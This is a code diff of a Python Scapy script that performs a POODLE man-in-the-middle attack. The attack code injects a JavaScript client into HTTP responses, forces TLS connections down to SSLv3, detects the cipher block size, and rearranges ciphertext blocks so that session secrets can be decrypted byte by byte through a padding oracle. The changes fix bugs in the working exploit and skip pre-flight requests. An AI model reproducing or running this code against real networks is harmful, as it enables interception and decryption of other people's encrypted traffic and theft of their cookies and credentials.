@@ -12,11 +12,6 @@ import threading
 import zlib
 import time
 
-SSL_V3_CODE = 768
-
-Stage = Enum('Stage', 'downgrade_dance block_length exploit stop')
-stage = Stage.block_length
-
 block_size = None
 
 # Track sessions using src_port as key
@@ -26,20 +21,25 @@ class Session:
 		self.downgrade_needed = True
 		self.src_port = src_port
 		self.skip_options = True
+		self.skip_options_response = True
 		self.ciphertext = None
 		
 # Need to get the server IP from DNS response
 server_ip = None
 server_ip = '108.188.248.81' # temp
 
-# for block_length stage
+# for block_size stage
 ciphertext_length = 0
 data_padding_size_needed = 0
+skip_options = True
 
 # For exploit stage
 block_to_move = 1
 current_offset = 0
 secret = {}
+
+option_request_length = None
+option_response_length = None
 
 load_layer('tls')
 
@@ -57,22 +57,29 @@ def copy_block_to_end(arr, copy_index):
 	arr_list[last_index:(last_index+block_size)] = arr[copy_index:(copy_index+block_size)]
 	return bytes(arr_list)
 
+def is_tls_data(data):
+	return len([i for i in range(len(data)) if list(data)[i:i+3] == [0x17, 0x03, 0x00]]) > 0
+
 def callback(packet):
 	global block_size
 	global block_to_move
 	global ciphertext_length
-	global stage
 	global data_padding_size_needed
+	global sessions
+	global skip_options
+	global option_request_length
+	global option_response_length
 
 	pkt = IP(packet.get_payload())
 
 	#print(pkt.src + " -> " + pkt.dst)
 	#print(pkt[0].summary())
 
-	if 'HTTP' in pkt:
+	if 'HTTP' in pkt and False:
 
 		# On outgoing HTTP requests, make sure there is no compression or caching
 		if pkt.src == config['target']:
+			print("Sending request to " + pkt.dst)
 			raw_http = str(pkt['HTTP']['Raw'].load)
 			encoding_pattern = 'Accept-Encoding: ([a-z-]+)'
 			cache_pattern = 'Cache-Control: ([a-z-]+)'
@@ -91,30 +98,33 @@ def callback(packet):
 			#pkt['HTTP']['HTTP Request'].fields['Headers'] = str_headers
 
 		# On return packets, inject the JS client
-		if pkt.dst == config['target'] and pkt.haslayer(HTTP):
-			print(pkt['HTTP']['Raw'].load)
-			pkt['HTTP']['Raw'].load += js_client_html
+		elif pkt.dst == config['target'] and 'HTTP' in pkt:
+			print("HTTP Payload: " + str(pkt['HTTP']['Raw'].load))
+			pkt['HTTP']['Raw'].load += bytes(js_client_html, 'utf8')
 			packet.set_payload(bytes(pkt))
 
-	#if pkt.src == config['target'] and pkt.haslayer(TLS):
-	#	print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
+	if pkt.src == config['target'] and pkt.dst == server_ip and pkt.haslayer(TLS):
+		print("TLS Type: {}".format(get_field(pkt.getlayer(TLS), 'type')))
 
 	if pkt.src == config['target'] and pkt.dst == server_ip and 'TLS' in pkt and get_field(pkt.getlayer(TLS), 'type') == "application_data":
-		src_port = pkt['TCP'].srcport
+		src_port = pkt['TCP'].sport
 		if not src_port in sessions:
 			sessions[src_port] = Session(src_port)
 
-		# Don't modify pre-flight check
-		if sessions[src_port].skip_options:
-			sessions[src_port].skip_options = False
-			packet.accept()
-			return
-
 		# The JS client is sending packets of increasing length
-		if block_length is None:
+		if block_size is None:
+
+			# Don't modify pre-flight check
+			if skip_options:
+				skip_options = False
+				packet.accept()
+				return
+			else:
+				skip_options = True
+
+			print("Got request length " + str(len(pkt)))
 			if ciphertext_length > 0:
 				data_padding_size_needed += 1
-				print(len(pkt))
 				if len(pkt) > ciphertext_length:
 					block_size = len(pkt) - ciphertext_length
 					print("Found block size: " + str(block_size))
@@ -123,22 +133,32 @@ def callback(packet):
 
 		# The JS client is sending the same packet repeatedly and waiting for us to decrypt it
 		else:
-			print("Switching block to end")
-			data = pkt['TLS']['TLS Application Data'].fields['data']
-			if ('TLS' in pkt['TLS'].payload):
-				data = pkt['TLS'].payload['TLS']['TLS Application Data'].fields['data']
-			sessions[src_port].ciphertext = data
+			# Don't modify pre-flight check
+			if option_request_length is None or len(pkt) == option_request_length:
+				print("Skipping options")
+				if option_request_length is None:
+					print("Option request length: " + str(len(pkt)))
+					option_request_length = len(pkt)
+				packet.accept()
+				return
 
-			print(data.hex())
+			print("Copying block to end")
+
 			start_index = block_size * block_to_move
-			
-			bytes_list = list(bytes(pkt))
-			tls_data_start_index = ([i + 5 for i in range(len(bytes_list)) if bytes_list[i:i+3] == [0x17, 0x03, 0x00]])[-1]
-			new_bytes = copy_block_to_end(bytes(pkt), tls_data_start_index + start_index)
-			packet.set_payload(new_bytes)
-			print(new_bytes[tls_data_start_index:].hex())
+			tls_data_start_index = ([i + 5 for i in range(len(bytes(pkt))) if list(bytes(pkt))[i:i+3] == [0x17, 0x03, 0x00]])[-1]
 
-	elif pkt.src == server_ip and pkt.dst == config['target'] and 'TLS' in pkt:
+			sessions[src_port].ciphertext = bytes(pkt)[tls_data_start_index:]
+
+			new_bytes = copy_block_to_end(bytes(pkt), tls_data_start_index + start_index)
+			new_packet = IP(new_bytes)
+			del new_packet[IP].chksum
+			del new_packet[TCP].chksum
+
+			packet.set_payload(bytes(new_packet))
+			packet.accept()
+			return
+
+	elif pkt.src == server_ip and pkt.dst == config['target'] and 'TLS' in pkt and block_size is not None:
 
 		# TLS Downgrade
 		if get_field(pkt.getlayer(TLS), 'type') == "application_data" and get_field(pkt['TLS'], 'version') != 'SSLv3' and pkt.src == server_ip:
@@ -147,12 +167,23 @@ def callback(packet):
 			packet.set_payload(bytes(pkt))
 
 		# If we get success (data instead of alert), do math to get byte
-		elif get_field(pkt.getlayer(TLS), 'type') == "application_data" and pkt['TCP'].dstport in sessions:
-			ciphertext = sessions[pkt['TCP'].dstport].ciphertext
-			decrypted_byte = (block_size - 1) ^ ciphertext[-block_size - 1] ^ ciphertext[((block_to_move + 1) * block_size) - 1]
-			decrypte_byte_index = (block_to_move * block_size) + current_offset
-			print("Decrypt byte at {}: {}".format(decrypt_byte_index, decrypted_byte))
-			secret[decrypted_byte_index] = decrypted_byte
+		elif get_field(pkt.getlayer(TLS), 'type') == "application_data" and pkt['TCP'].dport in sessions:
+			# Ignore response to pre-flight check
+			if option_response_length is None or len(pkt) == option_response_length:
+				print("Skipping options response")
+				option_response_length = len(pkt)
+				packet.accept()
+				return
+			session = sessions[pkt['TCP'].dport]
+
+			ciphertext = session.ciphertext
+			session.skip_options_response = True
+			
+			if ciphertext is not None:
+				decrypted_byte = (block_size - 1) ^ ciphertext[-block_size - 1] ^ ciphertext[((block_to_move + 1) * block_size) - 1]
+				decrypted_byte_index = (block_to_move * block_size) + current_offset
+				print("Decrypt byte at {}: {}".format(decrypted_byte_index, decrypted_byte))
+				secret[decrypted_byte_index] = decrypted_byte
 
 	elif pkt.dst == config['target'] and 'DNS' in pkt:
 		pass
